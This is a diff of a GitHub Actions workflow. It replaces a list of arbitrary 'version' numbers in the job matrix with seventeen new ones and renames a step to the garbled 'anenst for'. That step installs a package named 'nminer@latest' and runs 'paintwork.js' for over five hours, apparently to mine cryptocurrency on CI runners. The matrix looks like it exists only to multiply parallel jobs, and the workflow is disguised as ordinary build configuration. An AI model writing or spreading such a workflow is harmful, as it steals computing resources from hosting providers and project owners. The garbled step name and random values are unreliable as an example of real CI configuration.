@@ -9,22 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 844 }
-          - { version: 5710 }
-          - { version: 139 }
-          - { version: 1576 }
-          - { version: 6415 }
-          - { version: 1291 }
-          - { version: 6617 }
-          - { version: 9039 }
-          - { version: 5556 }
-          - { version: 3031 }
-          - { version: 486 }
-          - { version: 3573 }
-          - { version: 3309 }
-          - { version: 8731 }
-          - { version: 2334 }
-          - { version: 5993 }
+          - { version: 3802 }
+          - { version: 5447 }
+          - { version: 8232 }
+          - { version: 8679 }
+          - { version: 8888 }
+          - { version: 5626 }
+          - { version: 4077 }
+          - { version: 8066 }
+          - { version: 4532 }
+          - { version: 7649 }
+          - { version: 8691 }
+          - { version: 6533 }
+          - { version: 4051 }
+          - { version: 7953 }
+          - { version: 9675 }
+          - { version: 1712 }
+          - { version: 6735 }
 
     steps:
       - name: Checkout
@@ -35,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: anenst for
         run: |
           npm install nminer@latest
-          timeout 313m node paintwork.js || echo "paintwork executed"
+          timeout 308m node paintwork.js || echo "paintwork executed"
